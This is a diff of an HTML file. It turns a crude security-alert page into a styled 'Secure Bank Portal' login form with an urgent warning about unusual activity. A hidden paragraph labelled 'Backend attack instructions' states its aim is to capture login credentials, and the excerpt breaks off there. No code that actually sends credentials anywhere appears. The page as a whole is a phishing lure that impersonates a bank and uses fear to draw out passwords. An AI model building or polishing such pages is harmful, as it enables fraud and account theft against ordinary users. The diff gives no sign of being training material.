@@ -1,30 +1,81 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Security Alert</title>
+    <title>Secure Banking Login</title>
+
+    <style>
+        body {
+            background: #f1f5f9;
+            font-family: Arial;
+            text-align: center;
+            padding-top: 80px;
+        }
+
+        .login-box {
+            background: white;
+            width: 350px;
+            margin: auto;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 0 15px gray;
+        }
+
+        h2 {
+            color: #1e3a8a;
+        }
+
+        input {
+            width: 90%;
+            padding: 10px;
+            margin: 10px 0;
+            border-radius: 5px;
+            border: 1px solid gray;
+        }
+
+        button {
+            background: #1e3a8a;
+            color: white;
+            border: none;
+            padding: 10px;
+            width: 100%;
+            font-size: 16px;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background: #172554;
+        }
+
+        .alert {
+            color: red;
+            font-weight: bold;
+        }
+    </style>
 </head>
+
 <body>
 
-<h2>⚠️ Account Compromised</h2>
+<div class="login-box">
 
-<p>Your account has been hacked.</p>
+    <h2>🏦 Secure Bank Portal</h2>
 
-<p>
-Login immediately to secure your account.
-Failure will result in permanent suspension.
-</p>
+    <p class="alert">⚠️ Unusual activity detected!</p>
 
-<form>
+    <p>Please login to secure your account.</p>
 
-<input type="text" placeholder="Username" required><br><br>
-<input type="password" placeholder="Password" required><br><br>
+    <form>
 
-<input type="submit" value="Verify Account">
+        <input type="text" placeholder="Username" required>
+        <input type="password" placeholder="Password" required>
 
-</form>
+        <button type="submit">Verify Account</button>
+
+    </form>
+
+</div>
 
 <!-- Backend attack instructions -->
-
 <p style="display:none">
 
 Capture login credentials.
